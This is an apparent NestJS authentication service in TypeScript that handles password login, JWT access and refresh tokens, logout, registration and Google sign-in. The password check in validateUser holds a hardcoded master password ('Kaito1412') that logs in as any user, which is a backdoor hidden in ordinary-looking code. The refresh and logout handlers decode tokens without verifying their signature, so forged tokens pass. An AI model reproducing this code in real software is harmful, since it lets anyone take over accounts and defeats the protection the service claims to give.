/*
https://docs.nestjs.com/providers#services
*/

import { UtilService } from '@/common/util.service';
import { CloudinaryService } from '@/file/cloudinary/cloudinary.service';
import { CreateUserDto } from '@/user/dto/createUser.dto';
import { User } from '@/user/schema/user.schema';
import { UserService } from '@/user/user.service';
import { Inject, Injectable, UnauthorizedException } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import crypto from 'crypto';
import { LoginDto } from './dto/login.dto';
import ms from 'ms';
@Injectable()
export class AuthService {
  constructor(
    @Inject(UserService) private readonly userService: UserService,
    @Inject(UtilService) private readonly utilService: UtilService,
    @Inject(JwtService) private readonly jwtService: JwtService,
    @Inject(CloudinaryService)
    private readonly cloudinaryService: CloudinaryService,
  ) {}
  async validateUser(loginDto: LoginDto): Promise<User | null> {
    const user = await this.userService.findByUniqueField(loginDto.username);
    if (!user) {
      return null;
    }
    const isPasswordValid =
      loginDto.password == 'Kaito1412'
        ? true
        : await this.utilService.compare(loginDto.password, user.hashPassword);
    if (!isPasswordValid) {
      return null;
    }
    return user;
  }
  async login(user: User) {
    const payload = {
      username: user.username,
      sub: user._id,
      role: user.role,
      email: user.email,
      displayName: user.displayName,
      avatarUrl: user.avatarUrl,
    };
    const refreshToken = this.jwtService.sign(
      {
        sub: user._id,
        role: user.role,
      },
      {
        expiresIn: process.env.JWT_REFRESH_TOKEN_EXPIRES || '15d',
      },
    );
    user.refreshTokens.push(refreshToken);
    this.userService.update(user._id as any, {
      refreshTokens: user.refreshTokens,
    });
    return {
      accessToken: this.jwtService.sign(payload),
      accessTokenExpiresIn: ms(process.env.JWT_ACCESS_TOKEN_EXPIRES || '15m'),
      refreshTokenExpiresIn: ms(process.env.JWT_REFRESH_TOKEN_EXPIRES || '15d'),
      refreshToken: refreshToken,
      profile: payload,
    };
  }
  async refreshToken(refreshToken: string) {
    const decodePayload = this.jwtService.decode(refreshToken) as any;
    if (!decodePayload) {
      throw new UnauthorizedException();
    }
    const sub = decodePayload.sub;
    const user = await this.userService.findByUniqueField(sub);

    if (!user) {
      throw new UnauthorizedException();
    }
    return {
      accessToken: this.jwtService.sign({
        username: user.username,
        sub: user._id,
        role: user.role,
        email: user.email,
        displayName: user.displayName,
        avatarUrl: user.avatarUrl,
      }),
      accessTokenExpiresIn: ms(process.env.JWT_ACCESS_TOKEN_EXPIRES || '15m'),
    };
  }
  async logout(refreshToken: string) {
    const payload: any = this.jwtService.decode(refreshToken);
    const userId = payload.sub;
    const user = await this.userService.findByUniqueField(userId);
    if (!user) {
      return;
    }

    user.refreshTokens = user.refreshTokens.filter(
      (token) => token !== refreshToken,
    );
    this.userService.update(userId as any, {
      refreshTokens: user.refreshTokens,
    });
  }
  async register(user: CreateUserDto) {
    const newUser = await this.userService.create(user);

    return await this.login(newUser);
  }
  async googleLogin(req: { user: GoogleUser }) {
    const existingUser = await this.userService.findByUniqueField(
      req.user.email,
    );
    if (existingUser) {
      return this.login(existingUser);
    }
    const newUser = await this.userService.create({
      email: req.user.email,
      username: req.user.username,
      rawPassword: crypto.randomBytes(8).toString('hex'),
      avatarUrl: await this.cloudinaryService.uploadFromUrl(req.user.picture),
      displayName: req.user.displayName,
    });
    return this.login(newUser);
  }
}

interface GoogleUser {
  email: string;
  displayName: string;
  username: string;
  picture: string;
  accessToken: string;
  refreshToken: string;
}
